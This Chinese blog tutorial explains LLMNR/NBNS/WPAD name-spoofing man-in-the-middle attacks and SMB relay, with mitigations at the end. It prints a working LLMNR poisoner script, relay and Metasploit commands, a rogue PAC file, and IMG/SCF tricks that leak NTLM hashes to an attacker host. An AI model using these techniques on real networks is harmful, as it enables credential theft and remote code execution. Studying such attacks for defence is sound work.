<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>名称欺骗中间人攻击 | ru0</title><meta name="description" content="名称欺骗中间人攻击 - ruo"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="ru0"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="ru0"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="/hmind" target="_self">HACKMIND</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/ru0" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">名称欺骗中间人攻击</h1><div class="post-info"><a></a>2017-12-14</div><div class="post-content"><h1 id="名称欺骗中间人攻击"><a href="#名称欺骗中间人攻击" class="headerlink" title="名称欺骗中间人攻击"></a>名称欺骗中间人攻击</h1><p>– write by ruo</p>
<h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>Link-Local Multicast Name Resolution (LLMNR)<br>链路本地多播名称解析</p>
<p>当我们执行<code>ping WEBTST01</code>将会发送LLMNR请求解析WEBTST01。所有的LLMNR包将会发送到组播地址224.0.0.252 MAC:<code>01:00:5E:00:00:FC</code>，响应主机将单播回应查询。</p>
<p><img src="https://i.imgur.com/o1jbyP5.png" alt=""></p>
<h4 id="LLMNR-packet-header-structure"><a href="#LLMNR-packet-header-structure" class="headerlink" title="LLMNR packet header structure"></a>LLMNR packet header structure</h4><p><img src="https://i.imgur.com/VHUoWeu.png" alt=""></p>
<ul>
<li>ID - A 16-bit identifier assigned by the program that generates any kind of query.</li>
<li>QR - Query/Response.</li>
<li>OPCODE - A 4-bit field that specifies the kind of query in this message. This value is set by the originator of a query and copied * into the response. This specification defines the behavior of standard queries and responses (opcode value of zero). Future specifications may define the use of other opcodes with LLMNR.</li>
<li>C - Conflict.</li>
<li>TC - TrunCation.</li>
<li>T - Tentative.</li>
<li>Z - Reserved for future use.</li>
<li>RCODE - Response code.</li>
<li>QDCOUNT - An unsigned 16-bit integer specifying the number of entries in the question section.</li>
<li>ANCOUNT - An unsigned 16-bit integer specifying the number of resource records in the answer section.</li>
<li>NSCOUNT - An unsigned 16-bit integer specifying the number of name server resource records in the authority records section.</li>
<li>ARCOUNT - An unsigned 16-bit integer specifying the number of resource records in the additional records section.</li>
</ul>
<h4 id="LLMNR-Poison"><a href="#LLMNR-Poison" class="headerlink" title="LLMNR Poison"></a>LLMNR Poison</h4><p>基于名字解析的ip欺骗</p>
<p>Python模拟LLMNR响应Demo<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!python</span></div><div class="line"><span class="comment">#/usr/bin/env python</span></div><div class="line"></div><div class="line">__doc__ = <span class="string">"""</span></div><div class="line"><span class="string">    LLMNR Answer, by Her0in</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> socket, struct</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">LLMNR_Answer</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr)</span>:</span></div><div class="line"></div><div class="line">        self.IPADDR  = addr</div><div class="line">        self.las = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</div><div class="line">        self.init_socket()</div><div class="line">        self.populate()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">populate</span><span class="params">(self)</span>:</span></div><div class="line"></div><div class="line">        self.AnswerData = (</div><div class="line">            <span class="string">"TID"</span>               <span class="comment"># Tid</span></div><div class="line">            <span class="string">"\x80\x00"</span>          <span class="comment"># Flags  Query(0x0000)? or Response(0x8000) ?</span></div><div class="line">            <span class="string">"\x00\x01"</span>          <span class="comment"># Question</span></div><div class="line">            <span class="string">"\x00\x01"</span>          <span class="comment"># Answer RRS</span></div><div class="line">            <span class="string">"\x00\x00"</span>          <span class="comment"># Authority RRS</span></div><div class="line">            <span class="string">"\x00\x00"</span>          <span class="comment"># Additional RRS</span></div><div class="line">            <span class="string">"LENGTH"</span>            <span class="comment"># Question Name Length</span></div><div class="line">            <span class="string">"NAME"</span>              <span class="comment"># Question Name</span></div><div class="line">            <span class="string">"\x00"</span>              <span class="comment"># Question Name Null</span></div><div class="line">            <span class="string">"\x00\x01"</span>          <span class="comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span></div><div class="line">            <span class="string">"\x00\x01"</span>          <span class="comment"># Class</span></div><div class="line">            <span class="string">"LENGTH"</span>            <span class="comment"># Answer Name Length</span></div><div class="line">            <span class="string">"NAME"</span>              <span class="comment"># Answer Name</span></div><div class="line">            <span class="string">"\x00"</span>              <span class="comment"># Answer Name Null</span></div><div class="line">            <span class="string">"\x00\x01"</span>          <span class="comment"># Answer Type ,IPv4(0x0001)? or IPv6(0x001c)?</span></div><div class="line">            <span class="string">"\x00\x01"</span>          <span class="comment"># Class</span></div><div class="line">            <span class="string">"\x00\x00\x00\x1e"</span>  <span class="comment"># TTL Default:30s</span></div><div class="line">            <span class="string">"\x00\x04"</span>          <span class="comment"># IP Length</span></div><div class="line">            <span class="string">"IPADDR"</span>)           <span class="comment"># IP Address</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_socket</span><span class="params">(self)</span>:</span></div><div class="line">        self.HOST = <span class="string">"192.168.15.165"</span></div><div class="line">        self.PORT = <span class="number">5355</span></div><div class="line">        self.MulADDR  = <span class="string">"224.0.0.252"</span></div><div class="line">        self.las.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</div><div class="line">        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="number">255</span>)</div><div class="line">        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,</div><div class="line">        socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Answser</span><span class="params">(self)</span>:</span></div><div class="line">        self.las.bind((self.HOST, self.PORT))</div><div class="line">        <span class="keyword">print</span> <span class="string">"Listening..."</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            data, addr = self.las.recvfrom(<span class="number">1024</span>)</div><div class="line"></div><div class="line">            tid = data[<span class="number">0</span>:<span class="number">2</span>]</div><div class="line">            namelen = struct.unpack(<span class="string">'&gt;B'</span>, data[<span class="number">12</span>])[<span class="number">0</span>]</div><div class="line">            name = data[<span class="number">13</span>:<span class="number">13</span> + namelen]</div><div class="line"></div><div class="line">            data = self.AnswerData.replace(<span class="string">'TID'</span>, tid)</div><div class="line">            data = data.replace(<span class="string">'LENGTH'</span>, struct.pack(<span class="string">'&gt;B'</span>, namelen))</div><div class="line">            data = data.replace(<span class="string">'NAME'</span>, name)</div><div class="line">            data = data.replace(<span class="string">'IPADDR'</span>, socket.inet_aton(self.IPADDR))</div><div class="line"></div><div class="line">            <span class="keyword">print</span> <span class="string">"Poisoned answer(%s) sent to %s for name %s "</span> % (self.IPADDR, addr[<span class="number">0</span>], name)</div><div class="line">            self.las.sendto(data, addr)</div><div class="line"></div><div class="line">        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP,</div><div class="line">        socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))</div><div class="line">        self.las.close()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    llmnr = LLMNR_Answer(<span class="string">"11.22.33.44"</span>)</div><div class="line">    llmnr.Answser()</div></pre></td></tr></table></figure></p>
<h3 id="Network-Basic-Input-Output-System-NetBIOS"><a href="#Network-Basic-Input-Output-System-NetBIOS" class="headerlink" title="Network Basic Input/Output System (NetBIOS)"></a>Network Basic Input/Output System (NetBIOS)</h3><p>NetBIOS is an API providing various networking services.</p>
<p>NetBIOS provides three distinct services:</p>
<ul>
<li>Name service for name registration and resolution (ports: 137/udp and 137/tcp)</li>
<li>Datagram distribution service for connectionless communication (port: 138/udp)</li>
<li>Session service for connection-oriented communication (port: 139/tcp)</li>
</ul>
<h4 id="NBNS"><a href="#NBNS" class="headerlink" title="NBNS"></a>NBNS</h4><p>NetBIOS名字服务，将NetBIOS名称解析为相应IP地址。很多时候是启用TCP/IP上的NetBIOS。</p>
<p><img src="https://i.imgur.com/eA7fXEE.png" alt=""></p>
<p>当我们PING hostname或者socket.gethostbyname(‘hostname’)时，依次会在本地缓存查找，LMHOSTS，WINS服务器，广播“名称查询”数据包。</p>
<p><img src="https://i.imgur.com/rjQSub1.png" alt=""></p>
<h4 id="Nbtstat"><a href="#Nbtstat" class="headerlink" title="Nbtstat"></a>Nbtstat</h4><p>我们可以通过nbtstat命令来查看本地NetBIOS名称缓存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">NBTSTAT [ [-A IP address] [-c] [-n] [-R]]</div><div class="line">  -A   (适配器状态)    列出指定 IP 地址的远程机器的名称表。</div><div class="line">  -c   (缓存)          列出远程[计算机]名称及其 IP 地址的 NBT 缓存</div><div class="line">  -n   (名称)          列出本地 NetBIOS 名称。</div><div class="line">  -R   (重新加载)      清除和重新加载远程缓存名称表</div></pre></td></tr></table></figure>
<h4 id="SMBRelay"><a href="#SMBRelay" class="headerlink" title="SMBRelay"></a>SMBRelay</h4><p>SMB2<br>Server Message Block (SMB)服务器消息块协议，主要用于在计算机间共享文件、打印机、串口等。SMB2运行在TCP 139和445端口。</p>
<p>使用NTLMv2身份认证</p>
<p><img src="https://i.imgur.com/fB6vgaV.png" alt=""></p>
<ol>
<li>协商</li>
<li>挑战</li>
<li>认证</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Client (域中机器) ----&gt; Middle Attack (192.168.6.12) ----&gt; Server(192.168.6.4)</div><div class="line">						    !</div><div class="line">						    !</div><div class="line">						    V</div><div class="line">						DC (192.168.6.2)</div></pre></td></tr></table></figure>
<blockquote>
<p>Note<br>Windows Server 2008 R2 需关闭“对通信进行数字签名”，否则smbrelayx.py将报错 <strong>SMB SessionError: STATUS_ACCESS_DENIED({Access Denied}…</strong>，我们也可以通过NETLOGON (CVE-2015-0005)获取SMB session key。</p>
</blockquote>
<p>注册表禁用签名<br>HKLM\System\CurrentControlSet\Services\LanManServer\Parameters<br>RequireSecuritySignature REG_DWORD: 0 = Disabled</p>
<p>利用工具：<br>Impacket<br><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="external">https://github.com/CoreSecurity/impacket</a></p>
<p>Attack转发SMB请求到Server并执行命令calc.exe</p>
<p><code>python smbrelayx.py -h 192.168.6.4 -c &quot;calc.exe&quot;</code></p>
<p>Client以一个有效的账户登录(通常是域管)，命令行执行:</p>
<p><code>dir \\192.168.6.12\c$</code></p>
<p><img src="https://i.imgur.com/0s7ImOr.png" alt=""></p>
<h4 id="SMB签名"><a href="#SMB签名" class="headerlink" title="SMB签名"></a>SMB签名</h4><p>你需要一个有效的机器账户名和NTLM hashes，通过-domain参数指定DC。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WIN-7JFKE9MFQQ7$:RUOS:00000000000000000000000000000000:FB55268036B7C0ACE6E417F2EF959C28</div></pre></td></tr></table></figure></p>
<p>Usage:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./smbrelayx.py -h 192.168.6.4 -c &quot;calc.exe&quot; -machine-account RUOS/WIN-7JFKE9MFQQ7\$ -machine-hashes LMHASH:NTHASH -domain DC</div></pre></td></tr></table></figure></p>
<p><img src="https://i.imgur.com/MQyVCej.png" alt=""></p>
<h4 id="BadTunnel"><a href="#BadTunnel" class="headerlink" title="BadTunnel"></a>BadTunnel</h4><p>跨网段响应名称查询</p>
<h3 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h3><p>WPAD(Web Proxy Auto Discovery)让浏览器通过DHCP和DNS的查询来搜索PAC文件的位置。</p>
<p>当IE Internet Options连接中配置为自动检测设置时，IE会根据以下方式来查找WPAD.dat文件</p>
<ul>
<li>DHCP(252 option)</li>
<li>DNS A record query</li>
<li>NetBios</li>
<li>LLMNR</li>
</ul>
<p>在DNS中创建WPAD (无法解析？)</p>
<p><a href="https://technet.microsoft.com/en-us/library/cc995062.aspx" target="_blank" rel="external">https://technet.microsoft.com/en-us/library/cc995062.aspx</a></p>
<p><img src="https://i.imgur.com/FBblcZW.png" alt=""></p>
<p>Proxy auto-config<br>代理自动配置（PAC）文件定义了应用如何自动选择合适的代理服务器来访问给定的URL，习惯命名proxy.pac，WPAD标准使用wpad.dat。</p>
<p>A simple example of a PAC file:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindProxyForURL</span>(<span class="params">url, host</span>) </span>&#123;</div><div class="line">   <span class="keyword">if</span> (url== <span class="string">'http://www.baidu.com/'</span>) <span class="keyword">return</span> <span class="string">'DIRECT'</span>;</div><div class="line">   <span class="keyword">if</span> (host== <span class="string">'twitter.com'</span>) <span class="keyword">return</span> <span class="string">'SOCKS 127.0.0.10:7070'</span>;</div><div class="line">   <span class="keyword">if</span> (dnsResolve(host) == <span class="string">'10.0.0.100'</span>) <span class="keyword">return</span> <span class="string">'PROXY 127.0.0.1:8086;DIRECT'</span>;</div><div class="line">   <span class="keyword">return</span> <span class="string">'DIRECT'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="如何攻击？"><a href="#如何攻击？" class="headerlink" title="如何攻击？"></a>如何攻击？</h4><p>客户端首先查询WPAD名称IP，然后下载wpad.dat文件配置浏览器代理。</p>
<p>WPAD服务器<br><a href="http://192.168.6.12/wpad.dat" target="_blank" rel="external">http://192.168.6.12/wpad.dat</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindProxyForURL</span>(<span class="params">url, host</span>) </span>&#123;</div><div class="line">    <span class="comment">// URLs within this network are accessed directly</span></div><div class="line">    <span class="keyword">if</span> (isInNet(host, <span class="string">"127.0.0.1"</span>, <span class="string">"255.255.255.0"</span>))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"DIRECT"</span>;</div><div class="line">    &#125;</div><div class="line">	<span class="comment">// 192.168.6.1:8080 开启http代理</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"PROXY 192.168.6.1:8080; DIRECT"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>MSF NBNS响应攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf &gt; use auxiliary/spoof/nbns/nbns_response</div><div class="line">msf auxiliary(nbns_response) &gt; set regex WPAD</div><div class="line">msf auxiliary(nbns_response) &gt; set spoofip 192.168.6.12</div><div class="line">msf auxiliary(nbns_response) &gt; run</div></pre></td></tr></table></figure></p>
<p>当IE访问链接时，通过NBNS查询WPAD，攻击机将响应IP指向192.168.6.12。IE将自动下载wpad.dat文件并将地址缓存到注册表[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections]项，此时IE的流量将通过我们的代理服务器。</p>
<p><img src="https://i.imgur.com/Cah3y8L.png" alt=""></p>
<h4 id="抓取HASH"><a href="#抓取HASH" class="headerlink" title="抓取HASH"></a>抓取HASH</h4><p>Net-NTLM hashes 被用来作为网络认证，不同于NTLM hashes，不能用来执行 Pass-The-Hash 攻击，Net-NTLMv2 hash格式如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin::RUOS:1122334455667788:d5006d468c997ca37845df3d88316477:0101000000000000eaca11bf5f6ed301ca362b9cc58cc07500000000020000000000000000000000</div></pre></td></tr></table></figure>
<p>启动smb服务</p>
<p><img src="https://i.imgur.com/ZC6016i.png" alt=""></p>
<blockquote>
<p>Note<br>auxiliary/server/capture/http_ntlm 通过http方式访问将弹出Windows安全认证窗口</p>
</blockquote>
<p>IMG标签<br><code>&lt;img src=&quot;\\192.168.6.12\1.jpg&quot; /&gt;</code></p>
<p>test.scf放入共享目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[Shell]</div><div class="line">Command=2</div><div class="line">IconFile=\\192.168.6.12\test</div><div class="line">[Taskbar]</div><div class="line">Command=ToggleDesktop</div></pre></td></tr></table></figure></p>
<p>当用户打开嵌入IMG标签的网页或者访问含有test.scf文件的共享目录时将自动向192.168.6.12请求认证。</p>
<p><img src="https://i.imgur.com/rYznNPD.png" alt=""></p>
<h4 id="Crack-hash"><a href="#Crack-hash" class="headerlink" title="Crack hash"></a>Crack hash</h4><ul>
<li>字典破解（不推荐）<br>hashcat64 -m 5600 -D 1 –show john_hashes_netntlmv2 example.dict</li>
<li>彩虹表</li>
</ul>
<h3 id="自动化攻击工具"><a href="#自动化攻击工具" class="headerlink" title="自动化攻击工具"></a>自动化攻击工具</h3><ul>
<li><p>Inveigh<br>Inveigh is a PowerShell LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool<br><a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="external">https://github.com/Kevin-Robertson/Inveigh</a></p>
</li>
<li><p>Responder<br>LLMNR/NBT-NS/mDNS Poisoner<br><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="external">https://github.com/SpiderLabs/Responder</a></p>
</li>
<li><p>PS&gt;Attack<br><a href="https://github.com/jaredhaight/PSAttack" target="_blank" rel="external">https://github.com/jaredhaight/PSAttack</a></p>
</li>
</ul>
<h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./Responder.py -I eth0 -wrfvb -u 192.168.6.1:8888</div></pre></td></tr></table></figure>
<p>Responder启动将开启WPAD，SMB，WEB PROXY等服务，并响应所有名字解析到Responder服务器IP。受害者通过Responder代理服务器访问网页将被注入HTML代码 (-b参数)，并弹出认证钓鱼页面。当开启Serve-Exe = On参数时将替换客户端下载的所有exe为ExeFilename指定的程序。</p>
<p>由于会自动响应域名名称，导致显示太多信息，我们修改NBTNS.py将其忽略。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># NBT_NS Server class.</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">NBTNS</span><span class="params">(BaseRequestHandler)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></div><div class="line">		data, socket = self.request</div><div class="line">		Name = Decode_Name(data[<span class="number">13</span>:<span class="number">45</span>])</div><div class="line">		<span class="keyword">if</span> re.match(<span class="string">r'^([A-Z0-9]+(-[A-Z0-9]+)*\.)+[A-Z]&#123;2,&#125;$'</span>, Name):</div><div class="line">			<span class="comment">#print "this is a domain: " + Name</span></div><div class="line">			<span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/tpHTDCW.png" alt=""></p>
<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><ul>
<li>禁用LLMNR<br>reg add “HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient” /v EnableMulticast /t REG_DWORD /d 0 /f<br>reg add “HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows NT\DNSClient” /v EnableMulticast /t REG_DWORD /d 0 /f</li>
<li>禁用NetBIOS</li>
<li>启用SMB签名</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://dl.packetstormsecurity.net/1503-exploits/CORE-2015-0005.txt" target="_blank" rel="external">https://dl.packetstormsecurity.net/1503-exploits/CORE-2015-0005.txt</a></li>
<li><a href="https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python" target="_blank" rel="external">https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python</a></li>
<li><a href="https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/[MS-SMB2].pdf" target="_blank" rel="external">https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/[MS-SMB2].pdf</a></li>
<li><a href="http://www.ubiqx.org/cifs/SMB.html" target="_blank" rel="external">http://www.ubiqx.org/cifs/SMB.html</a></li>
</ul>
</div></article></div></main><footer><div class="paginator"><a class="next" href="/2017/11/17/数据库黑客/">next</a></div><div class="copyright"><p>&copy; 2017 <a href="http://ruos.org">ruo</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>